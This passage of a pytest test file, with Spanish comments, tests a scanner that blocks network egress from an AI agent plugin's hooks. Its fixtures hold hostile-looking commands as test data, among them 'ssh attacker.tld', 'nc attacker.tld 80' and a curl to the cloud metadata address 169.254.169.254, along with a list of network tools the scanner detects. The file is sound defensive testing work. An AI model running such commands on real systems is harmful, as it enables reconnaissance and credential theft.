    _alcanzables, sin_resolver = _recorrido_hooks(root)
    assert any("exfil.js" in c for _o, c in sin_resolver), sin_resolver


def test_f4fix2_mutante_p5_una_cita_a_ruta_inexistente_no_resuelve_por_nombre(tmp_path):
    """Gap #182, probe P5: `agent-kits/implementer/tools/journal.py` NO existe; antes «resolvia»
    al `journal.py` de `agent-kits/shared/` por BASENAME y el escaneo leia el fichero equivocado
    (9 passed). Ahora es una cita sin resolver."""
    root = _repo_minimo(tmp_path,
                        hooks_json=_hook_que_lanza("agent-kits/implementer/tools/journal.py"),
                        ficheros={"agent-kits/shared/journal.py": "import os\n"})
    alcanzables, sin_resolver = _recorrido_hooks(root)
    assert "agent-kits/shared/journal.py" not in alcanzables, sorted(alcanzables)
    assert any("implementer/tools/journal.py" in c for _o, c in sin_resolver), sin_resolver


def test_f4fix2_las_citas_por_nombre_del_repo_estan_declaradas_una_a_una():
    """Gap #182: sin fallback por basename, las pocas citas del repo que nombran un script SIN
    ruta (`os.path.join(shared, "knowledge-find.py")` dentro del heredoc de `session-context.sh`)
    se resuelven por una tabla NOMINAL `(fichero que cita, nombre) -> destino`, y cada destino
    existe. Una cita por nombre que no este en la tabla es una cita sin resolver."""
    assert _CITAS_POR_NOMBRE, "tabla vacia: el recorrido real dejaria citas sin resolver"
    for (citante, nombre), destino in sorted(_CITAS_POR_NOMBRE.items()):
        assert os.path.isfile(os.path.join(ROOT, citante)), citante
        assert os.path.isfile(os.path.join(ROOT, destino)), destino
        assert os.path.basename(destino) == nombre, (citante, nombre, destino)
    assert _resolver("journal.py", ROOT) is None                      # sin citante: sin base
    assert _resolver("agent-kits/implementer/tools/journal.py", ROOT) is None
    assert _resolver("journal.py", ROOT, citante=os.path.join(SHARED, "outbox.py")) \
        == os.path.join(SHARED, "journal.py")                          # junto al que cita: literal


def test_f4fix2_probe_p2_un_comentario_final_no_es_un_binario_de_red(tmp_path):
    """Gap #183, probe P2: `… # nota: no usamos ssh` en la cadena inline (y en un `.sh`) daba un
    falso positivo (`ssh` como token). El comentario fuera de comillas se quita antes de
    tokenizar; lo que va DENTRO de comillas o detras de `${#` no es comentario."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'bash "${CLAUDE_PLUGIN_ROOT}/hooks/ok.sh" # nota: no usamos ssh ni curl '),
        ficheros={"hooks/ok.sh": 'n="${#ARR[@]}"  # tampoco wget ni curl http://x\necho "$n"\n'})
    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)


def test_f4fix2_contraprueba_p1_quitar_comentarios_no_esconde_codigo(tmp_path):
    """Contraprueba P1 del #183: `jq`, `git status`, `grep -c ssl` no son binarios de red (sin
    falso positivo), y quitar comentarios no esconde el binario que va ANTES del `#` ni el que va
    detras de un `#` entrecomillado."""
    root = _repo_minimo(tmp_path / "p1", hooks_json=_hooks_json_con(
        "jq -r .x f.json | git status && grep -c ssl f.txt"))
    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)
    for comando, binario in (("ssh attacker.tld # comentario", "ssh"),
                             ('echo "a # b" && nc attacker.tld 80', "nc")):
        root = _repo_minimo(tmp_path / binario, hooks_json=_hooks_json_con(comando))
        assert any(m == binario for _e, m in _ofensores_de_red(root)), (comando, _ofensores_de_red(root))


# --------------------------------------------- micro-ronda fix3 de la Fase 4 (gaps #186 y #194)

def test_f4fix3_un_comentario_en_la_primera_linea_no_tapa_las_siguientes(tmp_path):
    """Gap #186 (regresion de fix2): `_sin_comentario_shell` trataba la cadena ENTERA como una
    linea y el primer `#` cortaba tambien las lineas siguientes (`echo ok # nota` + salto + `curl`
    al IMDS -> 0 motivos; en `a6723ec` daba 3). El comentario se quita LINEA A LINEA."""
    root = _repo_minimo(tmp_path / "imds", hooks_json=_hooks_json_con(
        "echo ok # nota\ncurl http://169.254.169.254/latest/meta-data/"))
    motivos = sorted(m for _e, m in _ofensores_de_red(root))
    assert motivos == ["169.254.169.254", "curl", "curl "], motivos
    root = _repo_minimo(tmp_path / "nc", hooks_json=_hooks_json_con("echo ok # x\nnc host 80"))
    assert "nc" in [m for _e, m in _ofensores_de_red(root)], _ofensores_de_red(root)
    root = _repo_minimo(tmp_path / "intent", hooks_json=_hooks_json_con(
        'echo ok # x\npython3 "${CLAUDE_PLUGIN_ROOT}/agent-kits/shared/knowledge-find.py"'
        " --intent relacional"),
        ficheros={"agent-kits/shared/knowledge-find.py": "import os\n"})
    assert _ofensores_de_flags_de_adaptador(root), "el `--intent` tras un comentario sobrevive"
    root = _repo_minimo(tmp_path / "args", hooks_json={"hooks": {"SessionStart": [{"hooks": [
        {"type": "command", "command": "bash", "args": ["-c", "echo ok # x\nssh a.tld"]}]}]}})
    assert "ssh" in [m for _e, m in _ofensores_de_red(root)], _ofensores_de_red(root)


def test_f4fix3_subprocess_con_comentario_en_la_primera_linea_sigue_detectado(tmp_path):
    """Gap #186 en el AST: `subprocess.run('echo ok # x' + salto + 'ssh a.tld', shell=True)`."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                        ficheros={"agent-kits/shared/net-probe.py":
                                  "import subprocess\n"
                                  "subprocess.run('echo ok # x\\nssh a.tld', shell=True)\n"})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
    assert "shell ssh" in motivos, motivos
    assert _sin_comentario_shell("a # b\nc # d\ne") == "a\nc\ne"


def test_f4fix3_ningun_hook_fuerza_ia_on_tampoco_con_continuacion(tmp_path):
    """Gap #194: la comprobacion «ningun hook pasa `--ia on`» era de UNA linea; una continuacion
    con barra invertida (`journal.py`, barra final, salto y `--ia on`) la esquivaba. Se unen las
    continuaciones con el mismo helper del #175 (`_unidades`)."""
    assert _hooks_que_fuerzan_ia() == [], _hooks_que_fuerzan_ia()
    for clave, comando in (
            ("una-linea", 'python3 "${CLAUDE_PLUGIN_ROOT}/agent-kits/shared/journal.py" --ia on'),
            ("continuacion", 'python3 "${CLAUDE_PLUGIN_ROOT}/agent-kits/shared/journal.py" \\\n'
                             "  --ia on"),
            ("igual", 'python3 "${CLAUDE_PLUGIN_ROOT}/agent-kits/shared/journal.py" \\\n'
                      "  --ia=on")):
        root = _repo_minimo(tmp_path / clave, hooks_json=_hooks_json_con(comando),
                            ficheros={"agent-kits/shared/journal.py": "import os\n"})
        assert _hooks_que_fuerzan_ia(root), ("el `--ia on` sobrevive", clave)


# ------------------------------------------------- espia VIVO sobre `cargar_adaptador` (gap #156)

_LLAMADA_KF_RE = re.compile(
    r"""run\(\s*os\.path\.join\(shared,\s*["']knowledge-find\.py["']\)\s*,(?P<args>[^)]*)\)""")


def _flags_reales_de_session_context():
    """Flags REALES con los que `hooks/session-context.sh` invoca `knowledge-find.py`, leidos del
    propio hook: si manana cambian, este test los ve."""
    texto = _texto(os.path.join(ROOT, "hooks", "session-context.sh"))
    m = _LLAMADA_KF_RE.search(texto)
    assert m, "no se encontro la invocacion de knowledge-find.py en hooks/session-context.sh"
    return re.findall(r"""["'](--[\w-]+)["']""", m.group("args"))


def _proyecto_con_backend_de_grafo_habilitado(root):
    """Gap #156: sin `taxonomy.json` el router sale ANTES de tocar `cargar_adaptador`
    (`knowledge-find.py`, `taxonomia(root) is None`), asi que el espia era INALCANZABLE y el test
    pasaba en vacio. Aqui el proyecto declara un backend de grafo habilitado en lectura y con el
    intent en `router.intents`: el unico motivo para que el espia no salte es el argv."""
    _escribir(os.path.join(root, "docs", "knowledge", "README.md"), "# Memoria tecnica\n")
    taxonomia = {
        "version": 1,
        "categories": [{"key": "DECISION", "folder": "adr", "min_evidence": "observation"}],
        "evidence_levels": ["observation", "single_case", "validated_case",
                            "multiple_validated_cases", "human_confirmed_rule"],
        "backends": {"memoria": {"type": "externo", "enabled": True, "config": {
            "mode": "read", "group_id": "proy-seguridad", "endpoint": "http://127.0.0.1:8001/mcp",
            "allow_remote": False, "timeout_ms": 2000,
            "router": {"intents": {"relacional": True}}}}},
    }
    _escribir(os.path.join(root, ".claude", "knowledge-services", "taxonomy.json"),
              json.dumps(taxonomia, ensure_ascii=False))


def _espia_de_carga_de_adaptador(monkeypatch):
    """Espia VIVO sobre `cargar_adaptador` (el unico camino del nucleo hacia un modulo con red):
    registra el intento y levanta, asi que ningun adaptador real llega a cargarse (cero red)."""
    binit = _cargar(os.path.join(KS_BACKENDS, "__init__.py"), "binit_espia_seguridad")
    cargas = []

    def _espia(tipo, *a, **k):
        cargas.append(tipo)
        raise RuntimeError("espia: aqui se habria cargado un adaptador con capacidad de red")

    monkeypatch.setattr(binit, "cargar_adaptador", _espia)
    cargar_original = kf._cargar_modulo
    ruta_backend = os.path.normcase(os.path.abspath(os.path.join(kf._dir_backends(), "__init__.py")))

    def cargar(ruta, nombre):
        if os.path.normcase(os.path.abspath(ruta)) == ruta_backend:
            return binit
        return cargar_original(ruta, nombre)

    monkeypatch.setattr(kf, "_cargar_modulo", cargar)
    return cargas


def _argv_del_hook(flags, root):
    valores = {"--root": root, "--limit": "0",
               "--contexto": "Checklist de Tareas - Memoria del grafo",
               "--iniciativa": "otra-iniciativa"}
    argv = []
    for flag in flags:
        argv.append(flag)
        if flag in valores:
            argv.append(valores[flag])
    return argv


def test_el_espia_de_adaptadores_si_salta_cuando_se_pasa_intent(tmp_path, monkeypatch, capsys):
    """CONTROL POSITIVO del gap #156: con el MISMO proyecto y el MISMO espia, añadir `--intent
    relacional` SI llega a `cargar_adaptador`. Sin este control el test de abajo no demuestra
    nada: podria estar pasando porque el camino esta muerto (que es lo que pasaba)."""
    root = str(tmp_path)
    _proyecto_con_backend_de_grafo_habilitado(root)
    cargas = _espia_de_carga_de_adaptador(monkeypatch)
    assert kf.main(_argv_del_hook(_flags_reales_de_session_context(), root)
                   + ["--intent", "relacional"]) == 0
    capsys.readouterr()
    assert cargas == ["externo"], cargas


def test_el_argv_real_del_hook_no_carga_ningun_adaptador(tmp_path, monkeypatch, capsys):
    """Con el argv EXACTO del hook -y un proyecto donde el backend de grafo SI esta habilitado y
    enrutado (control positivo arriba)-, `knowledge-find.py` no llega a `cargar_adaptador`."""
    flags = _flags_reales_de_session_context()
    assert flags, "el hook ya no pasa ningun flag a knowledge-find.py"
    assert "--intent" not in flags and "--backends-dir" not in flags, flags

    root = str(tmp_path)
    _proyecto_con_backend_de_grafo_habilitado(root)
    cargas = _espia_de_carga_de_adaptador(monkeypatch)
    assert kf.main(_argv_del_hook(flags, root)) == 0
    assert cargas == [], cargas
    assert "aciertos" in json.loads(capsys.readouterr().out)


# ============================================ 2. ningun dato excluido llega al grafo (CA-01/CA-07)

MARCA_JOURNAL = "TEXTO-EXCLUIDO-JOURNAL-no-debe-viajar"
MARCA_CANDIDATA = "TEXTO-EXCLUIDO-CANDIDATA-no-debe-viajar"
MARCA_LOG = "TEXTO-EXCLUIDO-LOG-de-prompts-no-debe-viajar"
MARCA_PROMPT = "TEXTO-EXCLUIDO-FICHERO-PROMPT-no-debe-viajar"
MARCA_SIN_ROUTING = "CUERPO-SIN-ROUTING-no-debe-viajar"
MARCA_ROUTING_FALSE = "CUERPO-ROUTING-FALSE-no-debe-viajar"
MARCA_ENRUTADA = "CUERPO-ENRUTADO-si-viaja"

_MARCAS_EXCLUIDAS = (MARCA_JOURNAL, MARCA_CANDIDATA, MARCA_LOG, MARCA_PROMPT,
                     MARCA_SIN_ROUTING, MARCA_ROUTING_FALSE)


def _escribir(ruta, texto):
    os.makedirs(os.path.dirname(ruta), exist_ok=True)
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(texto)


# ================================ 3. CA-14 (ollama invalido -> dead-letter) y CA-04 (degradacion)

# Salida estructurada INVALIDA de Ollama, en sus dos formas reales: (a) el proveedor devuelve una
# estructura que no cumple el contrato de `add_memory`, y (b) el servidor rechaza la llamada porque
# el modelo local devolvio un JSON roto (`structured_output_mode: json_object`).


def _unidades(texto):
    """Gap #175 (Important, fix2 Fase 4): la puerta era LINEA A LINEA, y la invocacion multilinea
    natural de un bloque bash (`python3 "$KS/knowledge-sync.py" \\` + `--backend <id> apply`)
    la evadia. Devuelve `[(linea_inicial, texto, en_codigo, es_bloque)]`: cada linea LOGICA (las
    continuaciones con barra invertida final se unen) y, ademas, cada bloque con valla completo
    como una unidad (`es_bloque` = linea de la valla de cierre; `False` en las lineas), para la
    escritura partida en lineas sin continuacion."""
    unidades, acumulada, bloque = [], None, None
    for numero, linea in enumerate(texto.replace(chr(13), "").split(chr(10)), 1):
        if linea.strip().startswith(("```", "~~~")):
            if acumulada:
                unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
                acumulada = None
            if bloque is None:
                bloque = (numero, [])
            else:
                unidades.append((bloque[0], " ".join(bloque[1]), True, numero))
                bloque = None
            continue
        if bloque is not None:
            bloque[1].append(linea)
        pieza = linea.strip() if acumulada else linea
        acumulada = (acumulada[0], acumulada[1] + " " + pieza) if acumulada else (numero, pieza)
        if linea.rstrip().endswith(chr(92)):
            acumulada = (acumulada[0], acumulada[1].rstrip()[:-1])
            continue
        unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
        acumulada = None
    if acumulada:
        unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
    if bloque is not None:                # valla sin cerrar: el resto del fichero es el bloque
        unidades.append((bloque[0], " ".join(bloque[1]), True, numero + 1))
    return unidades


# ----------------------------------------------------- mutantes de la puerta CA-05 (gap #157)
# Los cinco sobre un repo MINIMO en `tmp_path`: tres formas de invocacion que el literal anterior
# no veia y dos piezas inyectadas que no estaban en el recorrido.


# ------------------------------------------- mutantes de la puerta CA-05 (fix2 Fase 4)


# ============================ 5. guardarrail de red del cliente MCP (regresion del repo)

# IMDS de nube en sus cuatro formas (gaps #34c/#53/#71 de las Fases 2-3), direcciones sin sentido
# como destino y un host publico: ninguna puede conectar, con `allow_remote` o sin el.


# ============================================ 6. higiene de la propia suite (gap #166)


def test_hook_scan_runtime_membership_is_data(tmp_path):
    script = tmp_path / "membership.py"
    script.write_text('runtime = "codex"\nif runtime in ("claude", "codex", "opencode"):\n    pass\n', encoding="utf8")
    assert _egress_por_ast(str(script)) == []


def test_hook_scan_runtime_argparse_choices_are_data(tmp_path):
    script = tmp_path / "choices.py"
    script.write_text('import argparse\np = argparse.ArgumentParser()\np.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert _egress_por_ast(str(script)) == []


def test_hook_scan_runtime_constant_used_only_as_data(tmp_path):
    script = tmp_path / "constants.py"
    script.write_text('import argparse\np = argparse.ArgumentParser()\nRUNTIMES = ("claude", "codex", "opencode")\nif runtime not in RUNTIMES:\n    pass\np.add_argument("--runtime", choices=RUNTIMES)\n', encoding="utf8")
    assert _egress_por_ast(str(script)) == []


def test_hook_scan_runtime_values_used_as_command_are_detected(tmp_path):
    for index, body in enumerate((
        'import subprocess\nsubprocess.run(("claude", "codex", "opencode"))\n',
        'import subprocess\nRUNTIMES = ("claude", "codex", "opencode")\nsubprocess.run(RUNTIMES)\n',
        'import subprocess\nRUNTIMES = ("claude", "codex", "opencode")\nif runtime in RUNTIMES:\n    subprocess.run(RUNTIMES)\n',
    )):
        script = tmp_path / ("command-" + str(index) + ".py")
        script.write_text(body, encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_hook_scan_urlparse_is_local(tmp_path):
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/probe.py"),
        ficheros={"agent-kits/shared/probe.py": 'import urllib.parse\nparts = urllib.parse.urlparse("https://example.invalid")\n'})
    assert _ofensores_de_red(root) == []


def test_hook_scan_urlparse_does_not_hide_network(tmp_path):
    for index, body in enumerate((
        'import urllib.parse, urllib.request\nurllib.request.urlopen("https://example.invalid")\n',
        'from urllib import request\nrequest.urlopen("https://example.invalid")\n',
        'import importlib\nmod = importlib.import_module("urllib" + ".request")\n',
    )):
        root = _repo_minimo(tmp_path / str(index), hooks_json=_hook_que_lanza("agent-kits/shared/probe.py"),
            ficheros={"agent-kits/shared/probe.py": body})
        assert _ofensores_de_red(root)


def test_hook_scan_capture_and_native_guard_paths_resolve():
    launcher = os.path.join(ROOT, "hooks", "run-hook.mjs")
    for name in ("journal-capture.py", "native-guardrail.py", "agent-activity-store.py"):
        assert _resolver(name, ROOT, citante=launcher) == os.path.join(SHARED, name)


def test_hook_scan_adapter_spy_preserves_real_local_policy_reader(tmp_path, monkeypatch):
    root = str(tmp_path)
    _proyecto_con_backend_de_grafo_habilitado(root)
    before, reason = kf.taxonomia(root)
    assert reason is None and before["backends"]["memoria"]["enabled"] is True
    loads = _espia_de_carga_de_adaptador(monkeypatch)
    after, reason = kf.taxonomia(root)
    assert reason is None and after == before
    assert loads == []


def test_hook_scan_unknown_choices_receiver_is_not_exempt(tmp_path):
    for index, body in enumerate((
        'obj.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n',
        'runner(choices=("claude", "codex", "opencode"))\n',
        'import argparse\nargparse.ArgumentParser = runner\np = argparse.ArgumentParser()\np.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n',
        'import argparse\nimport unknown as argparse\np = argparse.ArgumentParser()\np.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n',
        'import argparse\np = argparse.ArgumentParser()\np.add_argument = runner\np.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n',
    )):
        script = tmp_path / ("unknown-" + str(index) + ".py")
        script.write_text(body, encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_hook_scan_runtime_constant_escape_is_not_exempt(tmp_path):
    for index, suffix in enumerate((
        'alias = RUNTIMES\nif runtime in RUNTIMES:\n    pass\n',
        'def f():\n    return RUNTIMES\n',
        'RUNTIMES = unknown\nif runtime in RUNTIMES:\n    pass\n',
        'def f(RUNTIMES):\n    return runtime in RUNTIMES\n',
    )):
        script = tmp_path / ("escape-" + str(index) + ".py")
        script.write_text('RUNTIMES = ("claude", "codex", "opencode")\n' + suffix, encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_hook_scan_parser_unknown_usage_is_not_exempt(tmp_path):
    for index, body in enumerate((
        'import urllib\n',
        'import urllib.parse\nparser = getattr(urllib.parse, "urlparse")\n',
        'import urllib.parse\nnamespace = urllib.parse.__dict__\n',
        'import urllib.parse as unknown\nunknown.urlparse("https://example.invalid")\n',
        'import urllib.parse\nexec("import urllib.request; urllib.request.urlopen(url)")\n',
    )):
        root = _repo_minimo(tmp_path / str(index), hooks_json=_hook_que_lanza("agent-kits/shared/probe.py"),
            ficheros={"agent-kits/shared/probe.py": body})
        assert _ofensores_de_red(root)


import pytest

@pytest.mark.parametrize("mutation", [
    'def bind():\n    p.add_argument = writer\nbind()\n',
    'alias = p\ndef bind():\n    alias.add_argument = writer\nbind()\n',
    'def bind():\n    alias = p\n    alias.add_argument = writer\nbind()\n',
    'alias = p\nsecond = alias\ndef bind():\n    second.add_argument = writer\nbind()\n',
    'def bind():\n    del p.add_argument\nbind()\n',
])
def test_hook_scan_parser_mutation_across_scopes_and_aliases_is_not_data(tmp_path, mutation):
    body = ('import argparse, subprocess\np = argparse.ArgumentParser()\n'
            'def writer(*args, choices):\n    subprocess.run(choices)\n' + mutation +
            'p.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n')
    script = tmp_path / 'rebound.py'
    script.write_text(body, encoding='utf8')
    assert 'argv claude' in _egress_por_ast(str(script))
    root = _repo_minimo(tmp_path / 'repo', hooks_json=_hook_que_lanza('agent-kits/shared/probe.py'),
                        ficheros={'agent-kits/shared/probe.py': body})
    assert _ofensores_de_red(root)


@pytest.mark.parametrize("binding", [
    'alias = second = p\nalias.add_argument = writer\n',
    'alias: object = p\nalias.add_argument = writer\n',
    'def bind():\n    alias = second = p\n    alias.add_argument = writer\nbind()\n',
    'def bind():\n    alias: object = p\n    alias.add_argument = writer\nbind()\n',
    'alias, other = p, None\nalias.add_argument = writer\n',
    '(alias := p)\nalias.add_argument = writer\n',
], ids=["chained", "annotated", "nested-chained", "nested-annotated", "unpacked", "named-expression"])
def test_hook_scan_parser_mutation_with_assignment_forms_is_not_data(tmp_path, binding):
    body = ('import argparse, subprocess\np = argparse.ArgumentParser()\n'
            'def writer(*args, choices):\n    subprocess.run(choices)\n' + binding +
            'p.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n')
    script = tmp_path / 'rebound.py'
    script.write_text(body, encoding='utf8')
    assert 'argv claude' in _egress_por_ast(str(script))
    root = _repo_minimo(tmp_path / 'repo', hooks_json=_hook_que_lanza('agent-kits/shared/probe.py'),
                        ficheros={'agent-kits/shared/probe.py': body})
    assert _ofensores_de_red(root)


@pytest.mark.parametrize("mutation", [
    'alias, *rest = p, None, None\nalias.add_argument = writer\n',
    '*rest, alias = None, None, p\nalias.add_argument = writer\n',
    'def bind():\n    alias, *rest = p, None, None\n    alias.add_argument = writer\nbind()\n',
    'aliases = [p]\naliases[0].add_argument = writer\n',
    'aliases = {"parser": p}\naliases["parser"].add_argument = writer\n',
    'alias = p\nsetattr(alias, "add_argument", writer)\n',
    'alias = p\nmethod = "add_argument"\nsetattr(alias, method, writer)\n',
], ids=["starred-prefix", "starred-suffix", "nested-starred", "list-alias", "dict-alias", "setattr", "dynamic-setattr"])
def test_hook_scan_parser_method_mutation_cannot_hide_runtime_argv(tmp_path, mutation):
    body = ('import argparse, subprocess\np = argparse.ArgumentParser()\n'
            'def writer(*args, choices):\n    subprocess.run(choices)\n' + mutation +
            'p.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n')
    script = tmp_path / 'rebound.py'
    script.write_text(body, encoding='utf8')
    assert 'argv claude' in _egress_por_ast(str(script))
    root = _repo_minimo(tmp_path / 'repo', hooks_json=_hook_que_lanza('agent-kits/shared/probe.py'),
                        ficheros={'agent-kits/shared/probe.py': body})
    assert _ofensores_de_red(root)


@pytest.mark.parametrize("mutation", [
    'alias.__class__ = Rebound\n',
    'setattr(alias, "__class__", Rebound)\n',
    'alias._add_action = intercept\n',
], ids=["class-alias", "class-setter", "internal-method-alias"])
def test_B23_QA2_1_parser_identity_mutation_does_not_hide_argv(tmp_path, monkeypatch, mutation):
    import subprocess
    body = ('import argparse, subprocess\np = argparse.ArgumentParser()\n'
            'class Rebound(argparse.ArgumentParser):\n'
            '    def add_argument(self, *args, choices):\n        return subprocess.run(choices)\n'
            'def intercept(action):\n    subprocess.run(action.choices)\n    return action\n'
            'alias = p\n' + mutation +
            'p.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n')
    seen = []
    with monkeypatch.context() as patch:
        patch.setattr(subprocess, 'run', lambda argv: seen.append(list(argv)))
        exec(compile(body, '<synthetic-parser-mutation>', 'exec'), {})
    assert seen == [['claude', 'codex', 'opencode']]
    script = tmp_path / 'rebound.py'
    script.write_text(body, encoding='utf8')
    assert 'argv claude' in _egress_por_ast(str(script))
    root = _repo_minimo(tmp_path / 'repo', hooks_json=_hook_que_lanza('agent-kits/shared/probe.py'),
                        ficheros={'agent-kits/shared/probe.py': body})
    assert _ofensores_de_red(root)


def test_activity_hook_closure_includes_real_local_modules():
    reachable, unresolved = _recorrido_hooks()
    assert unresolved == [], unresolved
    for relative in ("agent-kits/shared/agent-activity-store.py",
                     "agent-kits/shared/local-read.py", "agent-kits/shared/local-state.py",
                     "agent-kits/shared/agent-activity.py"):
        assert relative in reachable, (relative, sorted(reachable))
    assert _EGRESS_OPT_IN_DECLARADO.keys() == {"agent-kits/shared/journal.py"}


def _activity_security_repo(tmp_path, mutations=None, missing=()):
    # Private regular files only; nothing executes. Read the reviewed sources by exact path.
    relative_paths = ("hooks/run-hook.mjs", "agent-kits/shared/agent-activity-store.py",
                     "agent-kits/shared/local-read.py", "agent-kits/shared/local-state.py",
                     "agent-kits/shared/agent-activity.py")
    contents = {relative: _texto(os.path.join(ROOT, relative)) for relative in relative_paths
                if relative not in missing}
    contents.update(mutations or {})
    return _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'node "${CLAUDE_PLUGIN_ROOT}/hooks/run-hook.mjs" agent-activity --runtime=codex'),
        ficheros=contents)


def test_activity_hook_dependency_network_mutations_remain_detected(tmp_path):
    for index, relative in enumerate(("agent-kits/shared/local-read.py",
                                      "agent-kits/shared/local-state.py",
                                      "agent-kits/shared/agent-activity.py")):
        root = _activity_security_repo(tmp_path / str(index), mutations={relative: 'import socket\n'})
        assert (relative, "import socket") in _ofensores_de_red(root)


def test_activity_hook_loader_mutation_requires_review(tmp_path):
    relative = "agent-kits/shared/agent-activity-store.py"
    original = _texto(os.path.join(ROOT, relative))
    root = _activity_security_repo(tmp_path, mutations={relative: original + '\n_load("extra-module")\n'})
    reachable, unresolved = _recorrido_hooks(root)
    assert relative in reachable
    assert (relative, "cargas locales no revisadas") in unresolved


def test_activity_hook_missing_local_dependency_is_not_adopted(tmp_path):
    relative = "agent-kits/shared/local-state.py"
    root = _activity_security_repo(tmp_path, missing=(relative,))
    reachable, unresolved = _recorrido_hooks(root)
    assert relative not in reachable
    assert ("agent-kits/shared/agent-activity-store.py", relative) in unresolved


def test_activity_launcher_mutation_remains_fail_closed(tmp_path):
    original = _texto(os.path.join(ROOT, "hooks/run-hook.mjs"))
    root = _activity_security_repo(tmp_path, mutations={"hooks/run-hook.mjs": original + '\nfetch("https://example.invalid");\n'})
    offenders = _ofensores_de_red(root)
    assert ("hooks/run-hook.mjs", "launcher JavaScript no revisado") in offenders
    assert ("hooks/run-hook.mjs", "JavaScript fetch/WebSocket") in offenders


def test_activity_quiet_parser_local_choices_are_data(tmp_path):
    script = tmp_path / "quiet.py"
    script.write_text('def main():\n    import argparse\n'
        '    class QuietParser(argparse.ArgumentParser):\n'
        '        def error(self, message):\n            raise ValueError("invalid_arguments")\n'
        '    parser = QuietParser(add_help=False)\n'
        '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert _egress_por_ast(str(script)) == []


def test_activity_local_argparse_import_does_not_authorize_other_scope(tmp_path):
    script = tmp_path / "scope.py"
    script.write_text('def unrelated():\n    import argparse\n'
        'parser = argparse.ArgumentParser()\n'
        'parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert "argv claude" in _egress_por_ast(str(script))


def test_activity_unknown_parser_subclasses_stay_argv(tmp_path):
    for index, body in enumerate((
        '        def add_argument(self, *args, choices):\n            return writer(choices)\n',
        '        def error(self, message):\n            return writer(message)\n',
        '        def error(self, message):\n            raise ValueError("invalid_arguments")\n'
        '        def __init__(self, *args, **kwargs):\n            writer(args)\n',
    )):
        script = tmp_path / ("unknown-class-" + str(index) + ".py")
        script.write_text('def main():\n    import argparse\n'
            '    class QuietParser(argparse.ArgumentParser):\n' + body +
            '    parser = QuietParser()\n'
            '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_quiet_parser_builtin_rebinding_stays_argv(tmp_path):
    script = tmp_path / "builtin.py"
    script.write_text('ValueError = writer\n'
        'def main():\n    import argparse\n'
        '    class QuietParser(argparse.ArgumentParser):\n'
        '        def error(self, message):\n            raise ValueError("invalid_arguments")\n'
        '    parser = QuietParser()\n'
        '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert "argv claude" in _egress_por_ast(str(script))


def test_activity_runtime_subset_comparisons_are_data(tmp_path):
    script = tmp_path / "subagent-runtime.py"
    script.write_text('if runtime in ("claude", "codex"):\n    pass\n', encoding="utf8")
    assert _egress_por_ast(str(script)) == []


def test_activity_runtime_subset_used_as_command_stays_argv(tmp_path):
    for index, body in enumerate((
        'import subprocess\nsubprocess.run(("claude", "codex"))\n',
        'import subprocess\nRUNTIMES = ("claude", "codex")\nsubprocess.run(RUNTIMES)\n',
    )):
        script = tmp_path / ("subset-command-" + str(index) + ".py")
        script.write_text(body, encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def _quiet_class_definition(indent=""):
    return (indent + 'class QuietParser(argparse.ArgumentParser):\n' + indent +
            '    def error(self, message):\n' + indent +
            '        raise ValueError("invalid_arguments")\n')


def test_activity_quiet_parser_function_rebinding_stays_argv(tmp_path):
    for index, keyword in enumerate(("def", "async def")):
        script = tmp_path / ("factory-" + str(index) + ".py")
        script.write_text('def main():\n    import argparse\n' + _quiet_class_definition("    ") +
            '    ' + keyword + ' QuietParser(*args, **kwargs):\n        return writer\n'
            '    parser = QuietParser()\n'
            '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_quiet_parser_import_rebinding_stays_argv(tmp_path):
    for index, binding in enumerate(('from foreign import QuietParser', 'import foreign as QuietParser')):
        script = tmp_path / ("import-class-" + str(index) + ".py")
        script.write_text('def main():\n    import argparse\n' + _quiet_class_definition("    ") +
            '    ' + binding + '\n    parser = QuietParser()\n'
            '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_global_quiet_class_parameter_shadow_stays_argv(tmp_path):
    script = tmp_path / "parameter.py"
    script.write_text('import argparse\n' + _quiet_class_definition() +
        'def main(QuietParser):\n    parser = QuietParser()\n'
        '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert "argv claude" in _egress_por_ast(str(script))


def test_activity_global_quiet_class_local_binding_shadow_stays_argv(tmp_path):
    for index, binding in enumerate(('QuietParser = writer', 'from foreign import QuietParser',
                                      'import foreign as QuietParser', 'QuietParser: object = writer')):
        script = tmp_path / ("local-shadow-" + str(index) + ".py")
        script.write_text('import argparse\n' + _quiet_class_definition() +
            'def main():\n    ' + binding + '\n    parser = QuietParser()\n'
